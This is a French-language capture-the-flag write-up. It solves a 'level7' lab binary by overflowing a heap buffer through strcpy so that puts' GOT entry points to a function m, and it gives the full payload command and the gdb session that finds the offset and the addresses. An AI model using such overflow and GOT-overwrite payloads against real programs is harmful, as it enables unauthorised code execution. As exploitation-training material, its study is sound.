**Exploit**: Heap Overflow

**Commande**:  
```bash
./level7 $(python -c "print 'a' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
```

**Explication**:  
Dans cet exercice, strcpy ne verifie pas la longueur de la chaîne qu'elle doit copier, donc on peut faire un heap overflow, 
apres plusieurs tentatives, il n'y qu'avec le premier strcpy ou on peut avoir un heapoverflow, dans ce cas si les données copiées lors du premier appel sont plus grandes que l'espace alloué, 
il pourrait y avoir un écrasement de données dû au débordement de tampon.
rdement pour écraser l'adresse de la fonction puts dans la Global Offset Table (GOT) par l'adresse de notre propre fonction, nommée m. 
Cette manipulation nous permettrait de rediriger les appels à puts vers m, 

**Etapes**:  
- **On défini l'Offset pour provoquer le ébordement de tampon en utilisant un pattern**:    

```bash
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A AAAA
Starting program: /home/user/level7/level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A AAAA
```
- **Crash du programme avec une Segmentation Fault**:    
```bash
Program received signal SIGSEGV, Segmentation fault.
0xb7eb8f52 in ?? () from /lib/i386-linux-gnu/libc.so.6
```

- **Inspection des registres**:  

```bash
(gdb) info register
eax            0x41414141	1094795585
ecx            0xbffff90d	-1073743603
edx            0x37614136	929120566
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff6bc	0xbffff6bc
ebp            0xbffff6e8	0xbffff6e8
esi            0x0	0
edi            0x0	0
eip            0xb7eb8f52	0xb7eb8f52
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
Par défaut, les données de la destination sont dans edx:  
```bash
edx : 0x37614136 : 7aA6 : 6Aa7 : Aa0Aa1Aa2Aa3Aa4Aa5Aa`6Aa7`
```
On a donc un offset de 20

- **On cherche l'adresse de m et de puts:**
```bash
info function
All defined functions:
....
0x080484f4  m
0x08048400  puts
....
```

- **On cherche puts dans la GOT**:
(gdb) x/i 0x08048400
   0x8048400 <puts@plt>:	jmp    *0x8049928

- **Payload final**:  
```bash
$(python -c "print 'a' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
```

**Ressources**:

- [Heap Overflow - `strcpy`](https://security.stackexchange.com/questions/258891/heap-overflow-strcpy-on-x86-64-64bit)  
- [Heap Overflow Exploitation (YouTube)](https://www.youtube.com/watch?v=TfJrU95q1J4)
